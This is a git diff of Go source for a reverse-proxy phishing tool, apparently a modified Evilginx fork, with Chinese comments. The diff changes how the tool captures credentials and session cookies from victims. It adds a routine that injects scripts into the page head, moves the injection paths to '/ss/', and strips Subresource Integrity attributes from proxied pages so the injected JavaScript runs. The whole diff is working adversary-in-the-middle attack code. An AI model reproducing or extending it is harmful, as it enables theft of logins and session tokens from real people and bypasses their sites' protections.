@@ -214,8 +214,9 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			pl := p.getPhishletByPhishHost(req.Host)
 			remote_addr := from_ip
 
-			redir_re := regexp.MustCompile("^\\/s\\/([^\\/]*)")
-			js_inject_re := regexp.MustCompile("^\\/s\\/([^\\/]*)\\/([^\\/]*)")
+			// 处理重定向和 js 注入的请求    html body 已经在onresponse 插入了 自定义/ss/.js 代码， 这里匹配到直接返回定义的js内容
+			redir_re := regexp.MustCompile("^\\/ss\\/([^\\/]*)")
+			js_inject_re := regexp.MustCompile("^\\/ss\\/([^\\/]*)\\/([^\\/]*)")
 
 			if js_inject_re.MatchString(req.URL.Path) {
 				ra := js_inject_re.FindStringSubmatch(req.URL.Path)
@@ -252,6 +253,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						if s, ok := p.sessions[session_id]; ok {
 							var d_body string
 							if !s.IsDone {
+								// session未结束， 并且设置了重定向地址， 则注入动态重定向js
 								if s.RedirectURL != "" {
 									dynamic_redirect_js := DYNAMIC_REDIRECT_JS
 									dynamic_redirect_js = strings.ReplaceAll(dynamic_redirect_js, "{session_id}", s.Id)
@@ -287,7 +289,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				}
 			}
 
-			phishDomain, phished := p.getPhishDomain(req.Host)
+			phishDomain, phished := p.getPhishDomain(o_host)
 			if phished {
 				pl_name := ""
 				if pl != nil {
@@ -307,6 +309,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 					var create_session bool = true
 					var ok bool = false
+					// 前请求url带的 cookie   p.cookieName xxxx-xxxx)
 					sc, err := req.Cookie(session_cookie)
 					if err == nil {
 						ps.Index, ok = p.sids[sc.Value]
@@ -318,6 +321,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 							log.Error("[%s] wrong session token: %s (%s) [%s]", hiblue.Sprint(pl_name), req_url, req.Header.Get("User-Agent"), remote_addr)
 						}
 					} else {
+						// 这里代表，匹配到了phishlet ，但是没有lure（也就是没有cookie）
 						if l == nil && p.isWhitelistedIP(remote_addr, pl.Name) {
 							// not a lure path and IP is whitelisted
 
@@ -325,14 +329,14 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 							create_session = false
 							req_ok = true
-							/*
-								ps.SessionId, ok = p.getSessionIdByIP(remote_addr, req.Host)
-								if ok {
-									create_session = false
-									ps.Index, ok = p.sids[ps.SessionId]
-								} else {
-									log.Error("[%s] wrong session token: %s (%s) [%s]", hiblue.Sprint(pl_name), req_url, req.Header.Get("User-Agent"), remote_addr)
-								}*/
+
+							/*ps.SessionId, ok = p.getSessionIdByIP(remote_addr, req.Host)
+							if ok {
+								create_session = false
+								ps.Index, ok = p.sids[ps.SessionId]
+							} else {
+								log.Error("[%s] wrong session token: %s (%s) [%s]", hiblue.Sprint(pl_name), req_url, req.Header.Get("User-Agent"), remote_addr)
+							}*/
 						}
 					}
 
@@ -468,6 +472,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				}
 				req.Header.Set(p.getHomeDir(), o_host)
 
+				// 如果session已经初始化
 				if ps.SessionId != "" {
 					if s, ok := p.sessions[ps.SessionId]; ok {
 						l, err := p.cfg.GetLureByPath(pl_name, o_host, req_path)
@@ -640,6 +645,10 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						}
 					}
 				}
+				//// 如果接口需要删除cookie
+				//if req_path == "/companyOperator/login" {
+				//	req.Header.Del("Cookie")
+				//}
 
 				// patch GET query params with original domains
 				if pl != nil {
@@ -654,7 +663,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					}
 				}
 
-				// check for creds in request body
+				// check for creds in request body 从请求body中获取数据
 				if pl != nil && ps.SessionId != "" {
 					req.Header.Set(p.getHomeDir(), o_host)
 					body, err := ioutil.ReadAll(req.Body)
@@ -891,16 +900,20 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			if ps.SessionId != "" {
 				if ps.Created {
 					ck = &http.Cookie{
-						Name:    getSessionCookieName(ps.PhishletName, p.cookieName),
-						Value:   ps.SessionId,
-						Path:    "/",
-						Domain:  p.cfg.GetBaseDomain(),
+						Name:   getSessionCookieName(ps.PhishletName, p.cookieName),
+						Value:  ps.SessionId,
+						Path:   "/",
+						Domain: p.cfg.GetBaseDomain(),
+						//Domain:   ".visaai.fake.com",
+						//SameSite: http.SameSiteNoneMode,
+						//Secure:   true,
 						Expires: time.Now().Add(60 * time.Minute),
 					}
 				}
 			}
 
 			allow_origin := resp.Header.Get("Access-Control-Allow-Origin")
+
 			if allow_origin != "" && allow_origin != "*" {
 				if u, err := url.Parse(allow_origin); err == nil {
 					if o_host, ok := p.replaceHostWithPhished(u.Host); ok {
@@ -1004,6 +1017,10 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			// modify received body
 			body, err := ioutil.ReadAll(resp.Body)
 
+			//TODO 先把integrity   js校验干掉
+			re := regexp.MustCompile(`integrity=".*?"`)
+			body = []byte(re.ReplaceAllString(string(body), ""))
+
 			if pl != nil {
 				if s, ok := p.sessions[ps.SessionId]; ok {
 					// capture body response tokens
@@ -1100,6 +1117,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 										}
 									}
 								}
+
 								if stringExists(mime, sf.mime) && (!sf.redirect_only || sf.redirect_only && redirect_set) && param_ok {
 									re_s := sf.regexp
 									replace_s := sf.replace
@@ -1167,13 +1185,15 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 								js_params = &s.Params
 							}
 							//log.Debug("js_inject: hostname:%s path:%s", req_hostname, resp.Request.URL.Path)
+							// 如果匹配上trigger_paths  ，则注入匹配到的js内容 /ss/x/x.js
 							js_id, _, err := pl.GetScriptInject(req_hostname, resp.Request.URL.Path, js_params)
 							if err == nil {
-								body = p.injectJavascriptIntoBody(body, "", fmt.Sprintf("/s/%s/%s.js", s.Id, js_id))
+								body = p.injectJavascriptIntoHead(body, "", fmt.Sprintf("/ss/%s/%s.js", s.Id, js_id))
 							}
-
+							// 默认都会注入这个js /ss/x.js   DYNAMIC_REDIRECT_JS
+							// TODO 搞不懂这个目的
 							log.Debug("js_inject: injected redirect script for session: %s", s.Id)
-							body = p.injectJavascriptIntoBody(body, "", fmt.Sprintf("/s/%s.js", s.Id))
+							body = p.injectJavascriptIntoBody(body, "", fmt.Sprintf("/ss/%s.js", s.Id))
 						}
 					}
 				}
@@ -1329,6 +1349,26 @@ func (p *HttpProxy) injectJavascriptIntoBody(body []byte, script string, src_url
 		js_nonce = " nonce=\"" + m_nonce[1] + "\""
 	}
 	re := regexp.MustCompile(`(?i)(<\s*/body\s*>)`)
+	var d_inject string
+	if script != "" {
+		d_inject = "<script" + js_nonce + ">" + script + "</script>\n${1}"
+	} else if src_url != "" {
+		d_inject = "<script" + js_nonce + " type=\"application/javascript\" src=\"" + src_url + "\"></script>\n${1}"
+	} else {
+		return body
+	}
+	ret := []byte(re.ReplaceAllString(string(body), d_inject))
+	return ret
+}
+
+func (p *HttpProxy) injectJavascriptIntoHead(body []byte, script string, src_url string) []byte {
+	js_nonce_re := regexp.MustCompile(`(?i)<script.*nonce=['"]([^'"]*)`)
+	m_nonce := js_nonce_re.FindStringSubmatch(string(body))
+	js_nonce := ""
+	if m_nonce != nil {
+		js_nonce = " nonce=\"" + m_nonce[1] + "\""
+	}
+	re := regexp.MustCompile(`(?i)(<\s*/head\s*>)`)
 	var d_inject string
 	if script != "" {
 		d_inject = "<script" + js_nonce + ">" + script + "</script>\n${1}"
